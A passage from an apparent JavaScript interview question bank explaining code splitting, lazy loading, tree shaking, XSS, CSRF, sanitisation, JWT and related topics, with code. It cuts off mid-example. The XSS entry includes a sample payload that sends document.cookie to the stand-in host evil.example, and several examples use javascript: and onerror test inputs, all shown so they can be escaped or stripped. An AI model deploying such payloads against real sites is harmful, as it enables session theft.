=== j126 | M | What is Code Splitting?
**Code splitting breaks your JavaScript bundle into smaller chunks that load on demand, so users download only the code needed for the current page or feature instead of the whole app up front.**

### Why it matters
Large bundles hurt every Core Web Vital: more bytes to download, parse and compile delays interactivity (INP) and the main content (LCP), especially on mobile devices and slow networks.

### How it works
Bundlers (webpack, Vite/Rollup, Turbopack, esbuild) create a separate chunk wherever they see a **dynamic `import()`**. At runtime, calling `import("./module.js")` fetches that chunk the first time and returns a promise of the module.

### Common split points
- **Routes**: each page in its own chunk. Next.js, Remix and SvelteKit do this automatically.
- **Heavy components** shown later or rarely: charts, rich-text editors, maps, video players, admin panels.
- **Interaction-triggered features**: load the emoji picker when the button is clicked.
- **Large libraries used in one place**: PDF generation, date or markdown libraries.
- **Vendor chunks**: dependencies that change rarely, cached separately from app code.

### In React and Next.js
- `React.lazy(() => import("./Chart"))` with `<Suspense fallback={...}>`.
- `next/dynamic` for client components, with `ssr: false` for browser-only libraries.
- React Server Components keep server-only code out of the client bundle entirely.

### Trade-offs
Too many tiny chunks add request overhead and loading waterfalls. Split where it saves meaningful bytes, preload chunks you know will be needed soon (on hover, on idle), and measure with bundle analysers.
--- code
// Route- or feature-level split: this chunk is downloaded only when needed
async function openReportEditor() {
  const { createEditor } = await import("./report-editor.js"); // separate chunk
  return createEditor(document.querySelector("#editor"));
}

// React: lazy component + Suspense
import { lazy, Suspense, useState } from "react";
const Chart = lazy(() => import("./HeavyChart")); // its own chunk

export function Dashboard() {
  const [showChart, setShowChart] = useState(false);
  return (
    <>
      {/* preload on hover so the click feels instant */}
      <button onMouseEnter={() => import("./HeavyChart")} onClick={() => setShowChart(true)}>
        Show chart
      </button>
      {showChart && (
        <Suspense fallback={<p>Loading chart...</p>}>
          <Chart />
        </Suspense>
      )}
    </>
  );
}

// Next.js: client-only library without SSR
import dynamic from "next/dynamic";
export const Map = dynamic(() => import("./LeafletMap"), { ssr: false, loading: () => <p>Loading map...</p> });

=== j127 | E | What is Lazy Loading?
**Lazy loading means deferring the loading of a resource (images, iframes, scripts, components or data) until it is actually needed, typically when it is about to scroll into view or when the user interacts.**

### Native lazy loading in HTML
- `<img loading="lazy">` and `<iframe loading="lazy">`: the browser fetches them as they approach the viewport.
- **Never lazy-load the main above-the-fold image** (the LCP element); it delays the most important content. Use `fetchpriority="high"` for it instead.
- Always set `width` and `height` (or an aspect ratio) so lazy images do not cause layout shift.

### JavaScript lazy loading
- **Code**: dynamic `import()`, `React.lazy`, `next/dynamic` (see code splitting).
- **Visibility-based loading**: `IntersectionObserver` to load content, start videos or fetch more data when an element becomes visible (infinite scroll).
- **Interaction-based loading**: load a chat widget or editor only on click or hover.
- **Idle loading**: `requestIdleCallback` to warm up things that will be needed later.

### Data
Pagination and infinite scroll are lazy loading for data: fetch the next page only when the user gets near the end.

### Frameworks
Next.js `<Image>` lazy-loads by default and has a `priority` prop for the LCP image. Many frameworks also lazy-load routes automatically.

### Trade-offs
Lazy loading saves bandwidth and speeds up the initial load, but content may appear with a delay. Use generous `rootMargin` to start loading before the element is visible, and show placeholders or skeletons.
--- code
// Load images (or anything) shortly before they scroll into view
document.body.innerHTML = `
  <div style="height:120vh">Scroll down</div>
  <img data-src="https://picsum.photos/seed/lazy/400/200" width="400" height="200" alt="Lazy image" class="lazy">`;

const observer = new IntersectionObserver(
  (entries, obs) => {
    for (const entry of entries) {
      if (!entry.isIntersecting) continue;
      const img = entry.target;
      img.src = img.dataset.src; // start the real download now
      obs.unobserve(img); // load once
      console.log("loading", img.alt);
    }
  },
  { rootMargin: "300px" } // start 300px before it becomes visible
);
document.querySelectorAll("img.lazy").forEach((img) => observer.observe(img));

// Load a feature's code only when the user asks for it
document.body.insertAdjacentHTML("afterbegin", `<button id="chat">Open chat</button>`);
document.getElementById("chat").addEventListener(
  "click",
  async () => {
    // const { mountChat } = await import("./chat-widget.js");
    console.log("chat widget code would be downloaded now");
  },
  { once: true }
);

// Native: <img src="photo.jpg" loading="lazy" width="400" height="300" alt="...">

=== j128 | M | What is Tree Shaking?
**Tree shaking is a build-time optimisation where the bundler removes exported code that is never imported or used, based on the static `import`/`export` structure of ES modules.**

### How it works
ES module imports and exports are **static**: they are at the top level and cannot change at runtime. The bundler builds a graph of which exports are actually used, marks the rest as dead, and the minifier removes them. Rollup popularised it; webpack, Vite, esbuild and Turbopack all do it.

### What breaks tree shaking
- **CommonJS** (`require`/`module.exports`) is dynamic, so bundlers usually cannot remove unused parts.
- **Side effects at import time**: if a module runs code when imported (patching globals, registering things), the bundler must keep it. Packages declare `"sideEffects": false` (or a list of files) in `package.json` to say imports can be dropped safely.
- **Importing everything**: `import _ from "lodash"` pulls in the whole library. Use `lodash-es` with named imports, or per-method imports.
- **Barrel files** (`index.js` that re-exports everything) can slow builds and sometimes defeat tree shaking. Next.js has `optimizePackageImports` for popular libraries with this problem.
- **Dynamic property access** on namespace imports (`utils[name]`).

### How to check
Use a bundle analyser (`@next/bundle-analyzer`, `rollup-plugin-visualizer`, `source-map-explorer`) to see what ends up in each chunk.

### Writing tree-shakeable libraries
Ship ES modules, avoid top-level side effects, mark them with `sideEffects`, and export small independent functions rather than one big object.
--- code
// math.js  - an ES module with several exports
export const add = (a, b) => a + b;
export const multiply = (a, b) => a * b;
export function heavyStatistics(data) {
  /* hundreds of lines nobody imports */
}

// app.js
import { add } from "./math.js"; // only `add` ends up in the bundle
console.log(add(2, 3));

// Tree-shake friendly vs not:
import { debounce } from "lodash-es"; // ESM, named import: only debounce is bundled
// import _ from "lodash";             // CommonJS default import: the whole library is bundled

// A side effect at import time forces the bundler to keep the module:
// polyfills.js
//   Array.prototype.last = function () { return this[this.length - 1]; };

// package.json of a library: tell bundlers which files have side effects
// {
//   "name": "my-ui-kit",
//   "type": "module",
//   "sideEffects": ["*.css"]
// }

export { debounce };

=== j129 | M | Debounce vs Throttle use cases?
**Use debounce when only the final value after a burst matters (search input, autosave, resize-end), and throttle when you need regular updates while events keep firing (scroll position, drag, pointer tracking, rate-limited actions).**

### Debounce: "wait until they stop"
- **Search-as-you-type**: send one request after the user pauses typing.
- **Form validation**: validate a username after typing stops.
- **Autosave drafts**: save a second after the last edit.
- **Window resize end**: recalculate an expensive layout once resizing stops.
- **Leading debounce for buttons**: act on the first click and ignore rapid repeats (prevent double submit).

### Throttle: "at most every N ms"
- **Scroll handlers**: update a progress bar or sticky header while scrolling.
- **Infinite scroll checks** (though `IntersectionObserver` is better).
- **Drag and drop, drawing apps, pointer tracking**.
- **Live resize previews**.
- **Rate-limited APIs or analytics**: send position or presence updates every second.
- **Game input** like firing at a fixed rate.

### Visualising the difference
Events: `| | | | | | | | |` (continuous for 2 seconds)
- Throttle (500 ms): `|   |   |   |   |` runs regularly during the burst.
- Debounce (500 ms): `                 |` runs once, after the burst.

### Other tools
- `requestAnimationFrame` for visual updates (at most once per frame).
- `IntersectionObserver` instead of scroll handlers for visibility.
- `AbortController` to cancel stale requests, which is still needed with debounce when responses arrive out of order.
--- code
function debounce(fn, ms) {
  let t;
  return (...a) => {
    clearTimeout(t);
    t = setTimeout(() => fn(...a), ms);
  };
}
function throttle(fn, ms) {
  let last = 0;
  return (...a) => {
    const now = Date.now();
    if (now - last >= ms) {
      last = now;
      fn(...a);
    }
  };
}

const debounced = [];
const throttled = [];
const onSearch = debounce((q) => debounced.push(q), 50);
const onScroll = throttle((y) => throttled.push(y), 50);

// Simulate 300ms of continuous events, one every 10ms
for (let i = 1; i <= 30; i++) {
  setTimeout(() => {
    onSearch(`query ${i}`);
    onScroll(i * 10);
  }, i * 10);
}

await new Promise((r) => setTimeout(r, 450));
console.log("debounce ran", debounced.length, "time(s):", debounced); // 1 time: ["query 30"] - only the final value
console.log("throttle ran", throttled.length, "times:", throttled); // ~6 times, spread through the burst

=== j130 | H | JS Optimization techniques?
**Optimising JavaScript means shipping less code, doing less work on the main thread, avoiding unnecessary DOM and rendering work, and using efficient data structures and algorithms, always guided by measurement rather than guesses.**

### 1. Ship less JavaScript
- Code splitting and lazy loading; tree shaking; remove unused dependencies.
- Prefer platform features (native `<dialog>`, CSS animations, `Intl`) over libraries.
- Move logic to the server (React Server Components, server rendering).

### 2. Keep the main thread free
- Break long tasks (over 50 ms) into chunks and yield (`setTimeout`, `scheduler.yield()` where supported).
- Move heavy computation to **Web Workers**.
- Debounce and throttle high-frequency events; use passive listeners for scroll and touch.

### 3. Render efficiently
- Batch DOM reads and writes to avoid layout thrashing.
- Use `requestAnimationFrame` for visual updates; animate `transform` and `opacity`.
- Virtualise long lists (render only visible rows).
- Event delegation instead of thousands of listeners.
- In React: avoid unnecessary re-renders (memoisation, stable props, the React Compiler), and keep state close to where it is used.

### 4. Algorithms and data structures
- `Map`/`Set` for O(1) lookups instead of repeated `array.find`/`includes`.
- Avoid nested loops over large data; precompute indexes.
- Memoise expensive pure functions.

### 5. Network and caching
Cache responses, deduplicate requests, prefetch likely next steps, compress assets, and use HTTP caching and CDNs.

### Measure first
Use the Performance panel, Lighthouse, Core Web Vitals (LCP, INP, CLS) from real users, and `performance.mark/measure` around suspect code. Optimise the hot path you measured, not the one you guessed.
--- code
// Measure before optimising
performance.mark("start");

// 1. O(n*m) lookups -> O(n) with a Map
const users = Array.from({ length: 20_000 }, (_, i) => ({ id: i, name: `user${i}` }));
const orders = Array.from({ length: 20_000 }, (_, i) => ({ id: i, userId: (i * 7) % 20_000 }));

let t = performance.now();
const slow = orders.slice(0, 2_000).map((o) => users.find((u) => u.id === o.userId).name); // nested scan
const slowMs = performance.now() - t;

t = performance.now();
const byId = new Map(users.map((u) => [u.id, u])); // index once
const fast = orders.slice(0, 2_000).map((o) => byId.get(o.userId).name);
const fastMs = performance.now() - t;
console.log(`same result: ${slow.join() === fast.join()}, Map faster: ${fastMs < slowMs}`); // same result: true, Map faster: true

// 2. Break a long task into chunks so the page stays responsive
async function processInChunks(items, work, chunkMs = 8) {
  let i = 0;
  while (i < items.length) {
    const end = performance.now() + chunkMs;
    while (i < items.length && performance.now() < end) work(items[i++]);
    await new Promise((r) => setTimeout(r, 0)); // yield to input and rendering
  }
}
let total = 0;
await processInChunks(Array.from({ length: 200_000 }, (_, i) => i), (n) => (total += n));
console.log(total); // 19999900000

// 3. Memoise an expensive pure function
const cache = new Map();
const slugify = (s) => cache.get(s) ?? (cache.set(s, s.toLowerCase().replace(/\W+/g, "-")), cache.get(s));
console.log(slugify("Hello World"), cache.size); // hello-world 1

performance.mark("end");
console.log(`whole example took ${performance.measure("example", "start", "end").duration.toFixed(0)}ms`);

=== j131 | H | What is XSS?
**XSS (Cross-Site Scripting) is a vulnerability where an attacker gets their own JavaScript to run in other users' browsers on your site, usually by injecting it through data that your app renders as HTML without proper escaping.**

### Types
- **Stored XSS**: malicious input is saved (a comment, a profile name) and served to every visitor.
- **Reflected XSS**: input from the URL or a form is echoed straight back in the response.
- **DOM-based XSS**: client-side JavaScript takes data from `location`, `postMessage` or storage and writes it into the DOM unsafely (`innerHTML`, `document.write`, `eval`, `href="javascript:..."`).

### What attackers can do
Steal session data and tokens readable by JavaScript, act as the user (change email, make purchases), log keystrokes, show fake login forms, or spread to other users.

### Defences (layered)
1. **Escape output by default**: React, Vue and Angular escape text in templates. The danger zones are escape hatches: `dangerouslySetInnerHTML`, `v-html`, `innerHTML`.
2. **Use safe DOM APIs**: `textContent`, `setAttribute`, `createElement` instead of building HTML strings.
3. **Sanitise when you must render HTML** (e.g. rich text): use a well-maintained sanitiser like DOMPurify, or the Sanitizer API (`setHTML`) where supported.
4. **Validate URLs**: allow only `http:`/`https:` (and maybe `mailto:`) in user-provided links, never `javascript:`.
5. **Content Security Policy (CSP)**: an HTTP header that blocks inline scripts and untrusted sources; strict CSP with nonces greatly limits damage.
6. **HttpOnly cookies** so session cookies cannot be stolen by script.
7. **Trusted Types** (Chromium) to enforce safe DOM sinks.

### In interviews
Explain that escaping depends on context (HTML body, attribute, URL, JavaScript, CSS), and that frameworks protect you until you bypass them.
--- code
// Context-aware helpers that prevent common XSS mistakes
const escapeHtml = (s) =>
  String(s).replace(/[&<>"']/g, (c) => ({ "&": "&amp;", "<": "&lt;", ">": "&gt;", '"': "&quot;", "'": "&#39;" })[c]);

function safeUrl(input) {
  try {
    const url = new URL(input, "https://app.example.com");
    return ["http:", "https:", "mailto:"].includes(url.protocol) ? url.href : "#";
  } catch {
    return "#";
  }
}

const comment = `<img src=x onerror="fetch('https://evil.example/?c='+document.cookie)">`;
const website = "javascript:alert(document.domain)";

// Vulnerable: `<p>${comment}</p>` inserted with innerHTML runs the onerror handler.
// Safe:
const html = `<p>${escapeHtml(comment)}</p><a href="${escapeHtml(safeUrl(website))}">site</a>`;
console.log(html);
// <p>&lt;img src=x onerror=&quot;fetch(...)&quot;&gt;</p><a href="#">site</a>

console.log(safeUrl("https://example.com/profile"), safeUrl("JaVaScRiPt:alert(1)")); // https://example.com/profile #

// A strict Content-Security-Policy header (set by the server):
const csp = [
  "default-src 'self'",
  "script-src 'self' 'nonce-{random-per-request}'", // no inline scripts without the nonce
  "object-src 'none'",
  "base-uri 'none'",
  "frame-ancestors 'none'",
].join("; ");
console.log(csp);

=== j132 | H | What is CSRF?
**CSRF (Cross-Site Request Forgery) is an attack where a malicious site makes the user's browser send an authenticated request to your site, riding on cookies the browser attaches automatically, so actions happen as the user without their intent.**

### How it works
1. The user is logged in to `bank.example` with a session cookie.
2. They visit `evil.example`, which contains a hidden auto-submitting form that POSTs to `bank.example/transfer`.
3. The browser includes the bank's cookies, and the bank sees a legitimate-looking, authenticated request.

The attacker cannot **read** the response (the same-origin policy blocks that), but the state-changing action has already happened.

### Defences
1. **`SameSite` cookies**: `Lax` (the default in modern browsers) stops cookies on cross-site POSTs and sub-requests; `Strict` stops them on all cross-site requests. This blocks most CSRF on its own.
2. **CSRF tokens**: a random, per-session (or per-form) token included in forms or headers that the attacker cannot know. The server rejects requests without a matching token. Double-submit cookie and synchroniser token patterns are common.
3. **Check `Origin` / `Sec-Fetch-Site` headers** on state-changing requests and reject cross-site ones.
4. **Never change state with GET requests**: GET must be safe to repeat.
5. **Custom headers** for APIs: browsers do not let cross-site forms add headers like `X-Requested-With` without a CORS preflight.
6. **Re-authenticate** for critical actions (password change, payments).

### Frameworks
Many frameworks include CSRF protection. Next.js Server Actions only accept POST and compare the `Origin` header with the host, which protects against CSRF by default.

### CSRF vs XSS
XSS runs attacker code **in your origin**, which defeats CSRF defences. Fix XSS first.
--- code
// Express-style middleware (server side) showing layered CSRF defences
import crypto from "node:crypto";

const ALLOWED_ORIGINS = new Set(["https://app.example.com"]);

export function issueCsrfToken(req, res) {
  const token = crypto.randomBytes(32).toString("hex");
  req.session.csrfToken = token; // stored server-side with the session
  res.cookie("session", req.session.id, { httpOnly: true, secure: true, sameSite: "lax" });
  return token; // embed in a hidden form field or send to the SPA
}

export function csrfProtection(req, res, next) {
  if (["GET", "HEAD", "OPTIONS"].includes(req.method)) return next(); // GETs must not change state

  // 1. Reject cross-site requests by origin
  const origin = req.get("origin");
  if (origin && !ALLOWED_ORIGINS.has(origin)) return res.status(403).send("Bad origin");
  if (req.get("sec-fetch-site") === "cross-site") return res.status(403).send("Cross-site request");

  // 2. Require a token the attacker can't know (timing-safe comparison)
  const sent = Buffer.from(String(req.get("x-csrf-token") ?? req.body?._csrf ?? ""));
  const expected = Buffer.from(String(req.session.csrfToken ?? ""));
  if (sent.length !== expected.length || !crypto.timingSafeEqual(sent, expected)) {
    return res.status(403).send("Invalid CSRF token");
  }
  next();
}

// Client: fetch("/transfer", { method: "POST", headers: { "x-csrf-token": token }, body })

=== j133 | M | What is Sanitization?
**Sanitization is cleaning untrusted input so it is safe for the place it is going, for example removing dangerous HTML before rendering it, so the data can be used without enabling attacks like XSS.**

### Sanitising vs escaping vs validating
- **Validation** rejects input that does not match what you expect (an email, a number between 1 and 100). Do it on the server (the client can be bypassed) and ideally also on the client for UX.
- **Escaping** converts special characters so they are treated as text in a specific context (`<` becomes `&lt;` in HTML). This is the default defence and what frameworks do for you.
- **Sanitising** keeps some markup but removes the dangerous parts. You need it when users are allowed to submit **rich content** (comments with bold and links, markdown rendered to HTML, WYSIWYG editors).

### How to sanitise HTML properly
- Use a mature library such as **DOMPurify** (browser and Node via jsdom), or `sanitize-html` on the server.
- The **Sanitizer API** (`element.setHTML(html)`) is built into newer browsers, but check support before relying on it.
- Use an **allow-list** of tags and attributes. Block-lists always miss something (new tags, odd encodings, SVG, MathML).
- Strip event-handler attributes (`on*`) and dangerous URL schemes (`javascript:`).
- Sanitise as close to output as possible, and re-sanitise if the data could have changed.

### Other contexts need their own treatment
- SQL: parameterised queries, never string concatenation.
- Shell commands: avoid passing user input; use argument arrays.
- File names and paths: block `../` traversal.
- URLs: parse with `URL` and allow-list protocols and hosts.
--- code
// Minimal allow-list HTML sanitiser for demonstration (use DOMPurify in production)
const ALLOWED_TAGS = new Set(["B", "I", "EM", "STRONG", "A", "P", "UL", "LI", "BR"]);
const ALLOWED_ATTRS = { A: ["href", "title"] };

function sanitize(dirty) {
  const template = document.createElement("template");
  template.innerHTML = dirty; // parsed inertly: scripts don't run, images don't load

  const clean = (node) => {
    for (const child of [...node.children]) {
      if (!ALLOWED_TAGS.has(child.tagName)) {
        child.replaceWith(...child.childNodes); // drop the tag, keep its text
        continue;
      }
      for (const attr of [...child.attributes]) {
        const allowed = ALLOWED_ATTRS[child.tagName]?.includes(attr.name);
        const safeHref = attr.name !== "href" || /^(https?:|mailto:)/i.test(attr.value.trim());
        if (!allowed || !safeHref) child.removeAttribute(attr.name);
      }
      if (child.tagName === "A") child.setAttribute("rel", "noopener noreferrer");
      clean(child);
    }
  };
  clean(template.content);
  return template.innerHTML;
}

const input = `<p onclick="steal()">Hi <b>there</b> <img src=x onerror=alert(1)>
<a href="javascript:alert(1)">bad</a> <a href="https://example.com" style="x">good</a><script>alert(1)</script></p>`;
const output = sanitize(input);
console.log(output);
console.log(/onclick|onerror|javascript:|<script|<img/i.test(output)); // false - dangerous parts removed

document.body.innerHTML = output; // now safe to render

=== j134 | M | What is JWT?
**A JWT (JSON Web Token) is a compact, URL-safe token made of three base64url parts (`header.payload.signature`) that carries claims such as a user id and expiry, signed so the server can verify it was not tampered with.**

### The three parts
- **Header**: algorithm and type, e.g. `{"alg":"HS256","typ":"JWT"}`.
- **Payload**: claims. Registered claims include `sub` (subject/user id), `exp` (expiry), `iat` (issued at), `iss` (issuer), `aud` (audience). You can add custom ones like `role`.
- **Signature**: created with a secret (HMAC, e.g. HS256) or a private key (RSA/ECDSA, e.g. RS256, ES256).

### Signed, not encrypted
Anyone can decode the payload; base64 is not encryption. **Never put secrets or sensitive personal data in a JWT.** (JWE is the encrypted variant.)

### How it is used
The server issues a token at login; the client sends it with requests (usually `Authorization: Bearer <token>`); the server verifies the signature and expiry without a database lookup, which makes JWTs popular for stateless APIs and between services.

### Security essentials
- **Always verify** the signature with a trusted library, and pin the expected algorithm (reject `alg: none` and algorithm-confusion tricks).
- Check `exp`, `iss` and `aud`.
- Keep access tokens **short-lived** (minutes), with refresh tokens to renew them.
- **Storage**: in browsers, prefer HttpOnly, Secure, SameSite cookies over `localStorage`, which is readable by any XSS.
- **Revocation is hard**: a valid JWT works until it expires. Use short lifetimes, rotation, or a deny-list for logout and compromised accounts.

### JWT vs server sessions
Sessions are easy to revoke and keep data on the server; JWTs avoid a lookup per request and work across services. Many web apps are simpler with sessions.
--- code
// Sign and verify an HS256 JWT with the Web Crypto API (browsers, Node, Deno, Bun)
const enc = new TextEncoder();
const b64url = (bytes) => btoa(String.fromCharCode(...new Uint8Array(bytes))).replace(/\+/g, "-").replace(/\//g, "_").replace(/=+$/, "");
const b64urlJson = (obj) => b64url(enc.encode(JSON.stringify(obj)));
const fromB64url = (s) => JSON.parse(atob(s.replace(/-/g, "+").replace(/_/g, "/")));

const secret = await crypto.subtle.importKey("raw", enc.encode("a-long-random-server-secret"), { name: "HMAC", hash: "SHA-256" }, false, ["sign", "verify"]);

async function sign(payload) {
  const data = `${b64urlJson({ alg: "HS256", typ: "JWT" })}.${b64urlJson(payload)}`;
  const sig = await crypto.subtle.sign("HMAC", secret, enc.encode(data));
  return `${data}.${b64url(sig)}`;
}

async function verify(token) {
  const [header, payload, signature] = token.split(".");
  if (fromB64url(header).alg !== "HS256") throw new Error("Unexpected algorithm");
  const sigBytes = Uint8Array.from(atob(signature.replace(/-/g, "+").replace(/_/g, "/")), (c) => c.charCodeAt(0));
  const valid = await crypto.subtle.verify("HMAC", secret, sigBytes, enc.encode(`${header}.${payload}`));
  if (!valid) throw new Error("Invalid signature");
  const claims = fromB64url(payload);
  if (claims.exp * 1000 < Date.now()) throw new Error("Token expired");
  return claims;
}

const now = Math.floor(Date.now() / 1000);
const token = await sign({ sub: "user-42", role: "editor", iat: now, exp: now + 15 * 60 });
console.log(token.split(".").length, "parts"); // 3 parts
console.log(await verify(token)); // { sub: "user-42", role: "editor", iat: ..., exp: ... }

// Anyone can READ the payload (it is not encrypted)...
console.log(fromB64url(token.split(".")[1]).role); // editor
// ...but tampering breaks the signature
const [h, , s] = token.split(".");
const forged = `${h}.${b64urlJson({ sub: "user-42", role: "admin", exp: now + 900 })}.${s}`;
try {
  await verify(forged);
} catch (e) {
  console.log(e.message); // Invalid signature
}

=== j135 | E | Difference: AuthN vs AuthZ?
**Authentication (AuthN) verifies who a user is; authorization (AuthZ) decides what that authenticated user is allowed to do; authentication always comes first.**

### Authentication: "Who are you?"
- Passwords (hashed with bcrypt, scrypt or Argon2 on the server).
- **Passkeys / WebAuthn**: phishing-resistant, now widely supported and recommended.
- OAuth/OpenID Connect ("Sign in with Google/GitHub").
- Magic links, one-time codes, multi-factor authentication (MFA).
- Result: a session or token proving identity.
- Failure status: **401 Unauthorized** (the name is historical; it really means "unauthenticated").

### Authorization: "What can you do?"
- **RBAC** (role-based): admin, editor, viewer.
- **ABAC** (attribute-based): rules using user, resource and context attributes ("owners can edit their own posts during business hours").
- **ReBAC** (relationship-based): permissions derived from relationships, like Google Docs sharing.
- Scopes in OAuth access tokens (`read:orders`).
- Failure status: **403 Forbidden** (we know who you are, but you may not do this). Sometimes 404 is returned to avoid revealing that a resource exists.

### Golden rules
- **Enforce authorization on the server** for every request and every resource. Hiding a button in the UI is UX, not security.
- Check **object-level** access, not only the route: "can user 42 edit post 99?" Missing this is broken object level authorization, the top API security risk.
- Deny by default; centralise policies in one place.
--- code
// Authentication: establish identity (simplified)
const sessions = new Map([["sess-abc", { userId: 1 }]]);
const users = new Map([
  [1, { id: 1, name: "Ada", role: "editor" }],
  [2, { id: 2, name: "Linus", role: "viewer" }],
]);
const posts = new Map([[99, { id: 99, authorId: 1, title: "Hello" }]]);

function authenticate(sessionId) {
  const session = sessions.get(sessionId);
  if (!session) return { status: 401, error: "Not authenticated" };
  return { user: users.get(session.userId) };
}

// Authorization: central, deny-by-default policy with object-level checks
const policies = {
  "post:read": () => true,
  "post:edit": (user, post) => user.role === "admin" || (user.role === "editor" && post.authorId === user.id),
  "post:delete": (user) => user.role === "admin",
};
const can = (user, action, resource) => policies[action]?.(user, resource) ?? false;

function handleEditPost(sessionId, postId) {
  const auth = authenticate(sessionId); // 1. who are you?
  if (auth.error) return auth;
  const post = posts.get(postId);
  if (!post) return { status: 404 };
  if (!can(auth.user, "post:edit", post)) return { status: 403, error: "Forbidden" }; // 2. may you?
  return { status: 200, message: `${auth.user.name} may edit "${post.title}"` };
}

console.log(handleEditPost("sess-abc", 99)); // { status: 200, ... }
console.log(handleEditPost("bad-session", 99)); // { status: 401, error: "Not authenticated" }
sessions.set("sess-xyz", { userId: 2 });
console.log(handleEditPost("sess-xyz", 99)); // { status: 403, error: "Forbidden" }

=== j136 | E | What are ES6 Modules?
**ES modules (ESM) are JavaScript's built-in module system: each file has its own scope, shares code with `export`, and uses other files' code with `import`; the structure is static, which enables tooling like tree shaking and fast, parallel loading.**

### Syntax
- Named exports: `export const sum = ...` / `export { a, b as c }`.
- Default export: `export default function App() {}` (at most one per module).
- Imports: `import App, { sum } from "./app.js"`, `import * as utils from "./utils.js"`.
- Re-export: `export { thing } from "./thing.js"`, `export * from "./all.js"`.
- Dynamic: `const mod = await import("./heavy.js")`.
- JSON (modern runtimes): `import data from "./data.json" with { type: "json" }`.

### Key properties
- **Module scope**: no accidental globals.
- **Strict mode** automatically.
- **Evaluated once** and cached: all importers share the same instance.
- **Live bindings**: importers see updates to exported `let` variables, but cannot reassign them.
- **Static structure**: imports are hoisted and resolved before the code runs.
- **Top-level `await`** is allowed.
- In browsers, `<script type="module">` is deferred by default and supports import maps.

### ESM vs CommonJS
| | ESM | CommonJS |
|---|---|---|
| Syntax | `import` / `export` | `require` / `module.exports` |
| Loading | Static, asynchronous | Dynamic, synchronous |
| Tree shaking | Yes | Limited |
| Top-level await | Yes | No |

Node supports both (`"type": "module"` in `package.json`, or `.mjs`). Recent Node versions can also `require()` ES modules in most cases, easing interop.

### Tip
Prefer named exports in shared code: they are easier to refactor, autocomplete and tree-shake.
--- code
// --- math.js ---------------------------------------------------
export const PI = 3.14159;
export function area(r) {
  return PI * r * r;
}
export let calls = 0; // live binding: importers see updates
export function track() {
  calls++;
}
export default class Calculator {
  add(a, b) {
    return a + b;
  }
}

// --- app.js ----------------------------------------------------
import Calculator, { area, calls, track } from "./math.js";
import * as math from "./math.js"; // namespace import

track();
track();
console.log(calls); // 2 - live binding, read-only for importers
console.log(area(2), new Calculator().add(1, 2), math.PI);

// Lazy-load a module only when needed (code splitting)
const { formatReport } = await import("./reports.js");

// Import JSON with an import attribute (modern runtimes)
import config from "./config.json" with { type: "json" };

// In HTML:
// <script type="module" src="/app.js"></script>   (deferred, strict, own scope)

=== j137 | M | What is Dynamic Import?
**Dynamic import, `import(specifier)`, loads an ES module at runtime and returns a promise of its module namespace object, so you can load code conditionally, on demand, or based on values only known at runtime.**

### Static vs dynamic import
- Static `import x from "./x.js"` must be at the top level, with a fixed string, and is loaded before the module runs.
- `import()` can appear anywhere (inside functions, conditions, event handlers), can use computed paths, and loads the module only when called.

### Uses
- **Code splitting**: bundlers create a separate chunk for each `import()`, which is how route-based and component-based splitting work.
- **Load on interaction**: open an editor, chart or emoji picker only when the user asks for it.
- **Conditional features**: polyfills only for browsers that need them, or a platform-specific implementation.
- **Localisation**: `await import(`./locales/${lang}.js`)`.
- Loading ES modules from CommonJS code.

### Details
- The result is the module namespace: use `mod.default` for the default export, or destructure named exports.
- Modules are cached: importing the same specifier again returns the same instance without refetching.
- Errors (network failure, syntax error, missing file) reject the promise; handle them and show a fallback or retry.
- Bundlers need some static information to create chunks, so use template strings with a fixed directory rather than fully arbitrary variables.
- Preload chunks you will need soon (`<link rel="modulepreload">`, or call `import()` on hover).
--- code
// Load a module on demand (in the playground we import from a data: URL so it runs anywhere)
const moduleSource = 'export const greet = (name) => "Hello, " + name + "!"; export default (text) => text.toUpperCase() + "!";';
const url = `data:text/javascript,${encodeURIComponent(moduleSource)}`;

const mod = await import(url); // the module namespace object
console.log(mod.greet("Ada")); // Hello, Ada!
console.log(mod.default("dynamic")); // DYNAMIC!

// Same specifier -> same cached instance
console.log((await import(url)) === mod); // true

// Typical app patterns (bundlers turn each into a separate chunk):
async function openEditor() {
  try {
    const { createEditor } = await import("./editor.js"); // only downloaded on click
    return createEditor();
  } catch (err) {
    console.log("could not load the editor:", err.message);
  }
}

async function loadMessages(locale) {
  const { default: messages } = await import(`./locales/${locale}.js`); // one chunk per locale
  return messages;
}

console.log(typeof openEditor, typeof loadMessages);

=== j138 | M | Optional Chaining deep usage?
**Beyond `a?.b`, optional chaining short-circuits the entire remaining chain, works with computed keys and calls (`obj?.[key]`, `fn?.()`), and combines with `??` for defaults; used deliberately it replaces long `&&` guards, but overused it hides bugs.**

### Advanced behaviours
- **Whole-chain short-circuit**: in `a?.b.c.d()`, if `a` is nullish, nothing after it runs, including the call and its argument evaluation. You only need `?.` where a value may genuinely be missing.
- **Method that may not exist**: `plugin.onInit?.(config)` calls it only if defined. Note that `obj.method?.()` still throws if `obj` itself is missing; use `obj?.method?.()` then.
- **Dynamic keys and arrays**: `translations?.[locale]?.[key]`, `rows?.[i]?.cells?.[j]`.
- **With `delete`**: `delete obj?.prop` is allowed and does nothing if `obj` is nullish.
- **Grouping**: `(a?.b).c` is different from `a?.b.c`. The parentheses end the short-circuit, so `.c` runs on `undefined` and throws.
- **Not for assignment**: `a?.b = 1` is a syntax error.

### Combining with `??`
`user?.settings?.theme ?? systemTheme` gives a default only for missing values, keeping valid falsy values.

### When it hurts
- Hiding real bugs: if `order.customer` must always exist, `order?.customer?.name` turns a data bug into silently empty UI.
- Repeated deep chains are a sign the data shape should be normalised or validated once at the boundary (e.g. parse API responses with a schema and work with guaranteed types afterwards).
- TypeScript tells you precisely where values can be `undefined`, so you can use `?.` exactly where needed.
--- code
const config = {
  plugins: [{ name: "analytics", onInit: (c) => `analytics ready for ${c.env}` }, { name: "chat" }],
  translations: { en: { hello: "Hello" } },
};

// Optional calls: run hooks only if a plugin defines them
console.log(config.plugins.map((p) => p.onInit?.({ env: "prod" }) ?? `${p.name}: no init`));
// ["analytics ready for prod", "chat: no init"]

// Dynamic keys with defaults
const t = (locale, key) => config.translations?.[locale]?.[key] ?? key;
console.log(t("en", "hello"), t("fr", "hello")); // Hello hello

// Short-circuit skips the whole rest of the chain, including argument evaluation
let evaluated = false;
const nothing = null;
nothing?.deep.call((evaluated = true));
console.log(evaluated); // false

// Grouping changes the meaning
const data = { a: null };
console.log(data.a?.b.c); // undefined - the whole chain stops
try {
  console.log((data.a?.b).c); // parentheses end the short-circuit -> throws
} catch (e) {
  console.log(e.name); // TypeError
}

// Delete is allowed
const cache = null;
